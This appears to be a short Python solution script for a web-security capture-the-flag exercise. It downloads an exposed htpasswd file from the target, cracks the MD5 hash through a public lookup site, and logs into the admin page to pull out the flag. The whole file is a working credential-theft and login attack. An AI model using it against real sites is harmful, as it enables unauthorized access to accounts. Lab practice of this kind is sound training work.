import requests
import os
from lxml import html
import re

ip = os.getenv('darkly_ip')
baseurl = f'http://{ip}'

def get_couple():
    r = requests.get(baseurl + '/whatever/htpasswd')
    return r.text.split(':')

def reverse_md5(flag):
    r = requests.get('https://md5.gromweb.com/', params={'md5': flag})
    tree = html.fromstring(r.content)
    return tree.xpath('//em[@class="long-content string"]/text()')[0].lower()

def do_login(login, passwd):
    r = requests.post(baseurl + '/admin/', data={
        'username': login,
        'password': passwd,
        'Login': 'Login'
    })
    m = re.findall(re.compile('^.*The flag is : ([a-z0-9]+) <'), str(r.text))
    return m

if __name__ == '__main__':
    login, hash = get_couple()
    passwd = reverse_md5(hash[:-1])
    flag = do_login(login, passwd)
    print(*flag)

